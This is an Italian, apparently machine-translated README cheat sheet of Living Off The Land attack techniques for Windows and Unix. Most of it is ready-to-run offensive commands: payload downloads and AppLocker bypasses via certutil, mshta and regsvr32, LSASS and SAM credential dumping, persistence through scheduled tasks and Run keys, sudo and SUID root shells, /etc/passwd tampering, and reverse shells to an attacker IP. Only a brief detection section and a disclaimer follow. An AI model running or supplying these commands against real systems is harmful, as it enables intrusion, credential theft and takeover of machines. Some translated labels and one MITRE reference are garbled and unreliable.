<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏹 Living Off The Land (LOLBAS e GTFOBins) - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```
<palign="centro">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Defense Evasion">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Vivere dei frutti della terra">
</p>

<palign="centro">
  <b>🛠️ Riferimento completo per l'abuso di file binari di sistema preinstallati legittimi per eseguire codice, scaricare payload e aumentare i privilegi</b>
</p>

---

## 📋 Sommario

- [Introduzione](#-introduzione)
- [Perché vivere dei prodotti della terra?](#-perché-vivere dei prodotti della terra)
- [Parte 1: Windows LOLBAS](#-parte-1-windows-lolbas)
  - [Download e ingresso file](#download-file--ingresso)
  - [Esecuzione del codice e bypass di AppLocker](#esecuzione-codice--applocker-bypass)
  - [Dumping delle credenziali (LSASS, SAM, LSA)](#credential-dumping-lsass-sam-lsa)
  - [Ricognizione e scoperta](#ricognizione--scoperta)
  - [Persistenza e attività pianificate](#persistenza--attività-schedulate)
- [Parte 2: Unix/Linux GTFOBins](#-part-2-unix--linux-gtfobins)
  - [SUID e Sudo Shell Escapes](#suid--sudo-shell-escapes)
  - [Sfruttamento di lettura e scrittura di file](#file-read--write-exploitation)
  - [Ingresso di rete e shell inverse](#network-ingress--reverse-shells)
  - [Interpreti ad alto impatto GTFOBins](#gtfobins-interpreti-ad alto impatto)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e rilevamento](#-considerazioni-difensive--rilevamento)
- [Disclaimer legale](#-legal-disclaimer)
- [Risorse](#-risorse)

---

## 🎯 Introduzione

**Living Off The Land (LotL)** è un mestiere post-sfruttamento in cui gli aggressori e i red teamer utilizzano esclusivamente file binari, script e librerie di sistema legittimi, integrati e affidabili già presenti nel sistema operativo.

- **LOLBAS (Windows):** Vivere dei prodotti binari, script e librerie della terra.
- **GTFOBins (Unix/Linux):** raccolta curata di binari Unix di cui è possibile abusare per aggirare le restrizioni di sicurezza locali, sfuggire a shell limitate e aumentare i privilegi.

---

## ⚖️ Perché vivere della terra?

1. 🛡️ **Ignora la whitelist delle applicazioni:** I file binari come `certutil.exe`, `rundll32.exe` o `find` sono firmati digitalmente da Microsoft o dai fornitori di sistemi operativi e sono considerati affidabili da AppLocker, WDAC e SELinux.
2. 👁️ **Elude AV/EDR basati su firma:** nessun eseguibile dannoso esterno (`.exe`, `.elf`) viene rilasciato sul disco.
3. 📉 **Basso impatto operativo:** Riduce le anomalie forensi dei registri utilizzando strumenti di amministrazione nativi.

---

## 🪟 Parte 1: Windows LOLBAS

### Download e ingresso di file

#### 1. Certutil.exe
```cmd
:: Download file and decode from base64
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Base64 encode and decode local files
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```
#### 2. Bitsadmin.exe
```cmd
:: Asynchronous background download
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```
#### 3. Curl.exe e PowerShell
```powershell
:: Built-in curl (Windows 10+)
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell download string
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```
---

### Esecuzione del codice e bypass di AppLocker

#### 1. Mshta.exe (eseguire HTA/VBScript remoto)
```cmd
:: Execute malicious HTA script directly from remote URL (bypasses AppLocker)
mshta.exe http://10.10.14.5/payload.hta

:: Inline VBScript execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```
#### 2. Regsvr32.exe (tecnica Squiblydoo)
```cmd
:: Executes remote scriptlet (.sct) via COM without touching disk
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```
#### 3. Rundll32.exe
```cmd
:: Execute exported DLL function
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript in memory
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```
#### 4. Wmic.exe (esecuzione di script XSL)
```cmd
:: Execute arbitrary code via XSL stylesheet
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```
#### 5. Installutil.exe
```cmd
:: Execute unmanaged code inside signed .NET installer (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```
---

### Dumping delle credenziali (LSASS, SAM, LSA)

#### 1. Rundll32.exe + Comsvcs.dll (dump LSASS)
Scarica la memoria del processo LSASS senza eliminare Mimikatz:
```powershell
# Find LSASS Process ID
$lsassPid = (Get-Process lsass).Id

# Create minidump using built-in comsvcs.dll (Requires Administrator)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```
#### 2. Reg.exe (salvataggio degli hive SAM, SYSTEM e SECURITY)
```cmd
:: Dump local credential hives for offline extraction
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```
---

### Ricognizione e scoperta
```cmd
:: Find internal domain controllers
nltest /dclist:domain.local

:: List domain trust relationships
nltest /domain_trusts

:: Query Active Directory computers and users without RSAT
dsquery computer
dsquery user -name *admin*

:: Check active network connections with process IDs
netstat -ano
```
---

### Persistenza e attività pianificate
```cmd
:: Create scheduled task running every 15 minutes as SYSTEM
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Add Registry Run Key for current user
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```
---

## 🐧 Parte 2: GTFOB Unix/Linux

### SUID e Sudo Shell fuggono

Quando un binario ha il SUID impostato (`chmod u+s`) o viene concesso in `sudo -l`, abusarne per una shell di root immediata:

#### 1. Sudo / SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```
#### 2. Sudo / SUID `vim` / `vi`
```bash
# Escape from inside vim
:!/bin/sh

# One-liner execution
vim -c ':!/bin/sh'
```
#### 3. Sudo / SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
#### 4. Sudo / SUID `tar`
```bash
# Checkpoint command execution
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### 5. Sudo / SUID `nano`
```bash
# Inside nano: Press Ctrl+R, then Ctrl+X, then type:
reset; sh 1>&0 2>&0
```
#### 6. Sudo / SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```
#### 7. Sudo `less` / `more` / `man`
```bash
# Inside pager: Type !/bin/sh and press Enter
!/bin/sh
```
---

### Sfruttamento di lettura e scrittura di file

Quando non puoi generare direttamente una shell, usa le utilità di lettura/scrittura di file per sovrascrivere `/etc/passwd` o leggere `/etc/shadow`:

#### Sovrascrivi `/etc/passwd` tramite Sudo/SUID `tee`
```bash
# Generate password hash: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```
#### Leggi file sensibili tramite file binari SUID
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```
---

### Ingresso di rete e shell inverse

Trasferisci file e apri shell senza `curl` o `wget`:

#### 1. Shell inversa TCP nativa di Bash
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
#### 2. Netcat nativo (senza flag `-e`)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```
#### 3. Shell inversa crittografata OpenSSL
Sull'attaccante:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
Sul bersaglio:
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```
---

### GTFOBins Interpreti ad alto impatto

Se agli interpreti viene concesso Sudo/SUID:
```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```
---

## 📊 Tabella di consultazione rapida

| Sistema operativo | Binario | Scopo | Comando di abuso |
|----|--------|---------|------||
| **Vincere** | `certutil.exe` | Scarica il file | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **Vincere** | `mshta.exe` | Dirigente HTA remoto | `mshta http://<IP>/payload.hta` |
| **Vincere** | `regsvr32.exe` | Scriptlet Esecutivo | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **Vincere** | `rundll32.exe` | Dump LSASS | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Unix**| `find` | SUID Shell | `find . -exec /bin/sh -p \; -quit` |
| **Unix**| `awk` | Sudo Shell | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **Unix**| `vim` | Fuga dalla conchiglia | `vim -c ':!/bin/sh'` |
| **Unix**| `tee` | Sovrascrivi file | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ Considerazioni difensive e rilevamento

1. **Controlla la registrazione della riga di comando:**
   Abilita **Sysmon (ID evento 1)** e la registrazione della creazione dei processi Windows (ID evento 4688) con il controllo della riga di comando per monitorare gli argomenti anomali passati a `certutil`, `mshta` e `rundll32`.
2. **Bloccare le relazioni dannose genitore-figlio:**
   Monitora `mshta.exe` o `regsvr32.exe` che generano `cmd.exe` o `powershell.exe`.
3. **Limita le direttive Sudo:**
   Evita i caratteri jolly (`*`) in `/etc/sudoers`. Non consentire mai agli utenti di eseguire editor di testo (`vim`, `nano`) o compilatori come root.

---

## ⚠️ Disclaimer legale

> **IMPORTANTE:** Le tecniche di Living Off The Land abusano di utilità amministrative affidabili. Questo cheatsheet è riservato esclusivamente alle valutazioni di sicurezza autorizzate, al rafforzamento difensivo e allo studio educativo.

---

## 📚 Risorse

- [Repository ufficiale del progetto LOLBAS](https://lolbas-project.github.io/)
- [Repository ufficiale GTFOBins](https://gtfobins.github.io/)
- [MITRE ATT&CK: sovvertire i controlli di fiducia (T1564)](https://attack.mitre.org/techniques/T1564/)